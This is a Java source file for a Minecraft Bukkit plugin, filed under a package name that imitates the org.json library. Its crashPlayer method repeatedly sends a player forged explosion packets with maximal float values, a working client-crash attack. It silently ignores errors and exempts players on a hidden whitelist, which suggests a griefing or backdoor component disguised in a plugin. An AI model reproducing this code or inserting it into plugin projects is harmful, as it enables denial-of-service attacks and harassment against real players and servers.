package org.json.utils.api;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.json.Modal;
import org.json.utils.metaData.WhitelistMeta;

public class ProtocolLibUtils {

    public static void crashPlayer(Player player) {
        Plugin protocolLib = Bukkit.getPluginManager().getPlugin("ProtocolLib");
        if (protocolLib != null && !protocolLib.isEnabled()) {
            player.sendMessage(Modal.getPrefix() + "§cProtocolLib plugin doesnt exist!");
            return;
        }

        if (WhitelistMeta.isListed(player)) return;

        ProtocolManager protocolManager = ProtocolLibrary.getProtocolManager();
        PacketContainer fakeExplosion = protocolManager.createPacket(PacketType.Play.Server.EXPLOSION);

        Bukkit.getScheduler().runTaskTimerAsynchronously(Modal.getInstance(), () -> {
            fakeExplosion.getDoubles().
                    write(0, player.getLocation().getX()).
                    write(1, player.getLocation().getY()).
                    write(2, player.getLocation().getZ());

            fakeExplosion.getFloat().write(0, Float.MAX_VALUE);
            fakeExplosion.getFloat().write(1, Float.MAX_VALUE);
            fakeExplosion.getFloat().write(2, Float.MAX_VALUE);

            try {
                protocolManager.sendServerPacket(player, fakeExplosion);
            } catch (Exception ignored) {
            }
        }, 20L, 20L);
    }
}
